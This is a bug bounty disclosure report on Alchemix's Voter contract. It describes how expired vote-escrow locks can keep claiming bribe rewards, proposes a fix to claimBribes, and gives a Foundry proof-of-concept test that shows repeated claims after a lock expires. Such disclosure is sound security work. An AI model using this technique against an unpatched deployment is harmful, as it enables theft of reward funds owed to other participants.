# 31082 - \[SC - Critical] Expired locks can be used to claim rewards

Submitted on May 12th 2024 at 12:32:07 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31082

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield

## Description

This report is so short because the bug is straightforward to explain and prove.

## Vulnerability Details

Expired locks can keep claiming rewards for any bribe.

## Recommended Fix

The fix requires checking that **block.timestamp** is larger than the lock's expiration date when claiming bribes using the `claimBribes(...)` function in the `Voter` smart contract.

The permanently fixed function is:

```
function claimBribes(address[] memory _bribes, address[][] memory _tokens, uint256 _tokenId) external {
    require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId));

    require(IVotingEscrow(veALCX).lockEnd(_tokenId) > block.timestamp, "token expired");

    for (uint256 i = 0; i < _bribes.length; i++) {
        IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]);
    }
}
```

## Impact

Stealing bribe rewards using expired tokens can lead to solvency issues.

## Proof of Concept

This proof of concept can be added to `src/test/Voting.t.sol`. It demonstrates how a user can create a lock for a min. of 1 epoch, and keep claiming rewards forever (even after expired).

```
    function testClaimingBribesWithExpiredLock() public {

        // User 1
        uint256 tokenId1 = createVeAlcx(holder, TOKEN_1, nextEpoch, false);
        
        address bribeAddress = voter.bribes(address(sushiGauge));
        // Add BAL bribes to sushiGauge
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);
        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10000;
        address[] memory bribes = new address[](1);
        bribes[0] = address(bribeAddress);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = bal;

        // Step 1- Holder votes
        hevm.prank(holder);
        voter.vote(tokenId1, pools, weights, 0);

        console2.log("------------------------------------------------------------------------");
        console2.log("bal balance of holder before voting", IERC20(bal).balanceOf(holder));

        // Step 2- Start second epoch
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        bool expired =  veALCX.lockEnd(tokenId1) < block.timestamp;
        assertEq(expired, true, "token should be expired");

        // Step 3- Holder claims
        hevm.prank(holder);
        voter.claimBribes(bribes, tokens, tokenId1);
        
        // Step 4- Start third epoch
        hevm.warp(newEpoch());
        voter.distribute();
        createThirdPartyBribe(bribeAddress, bal, TOKEN_100K);

        // Step 5- Holder claims
        hevm.prank(holder);
        voter.claimBribes(bribes, tokens, tokenId1);

        console2.log("------------------------------------------------------------------------");
        console2.log("bal balance of holder after voting", IERC20(bal).balanceOf(holder));
        
    }
```
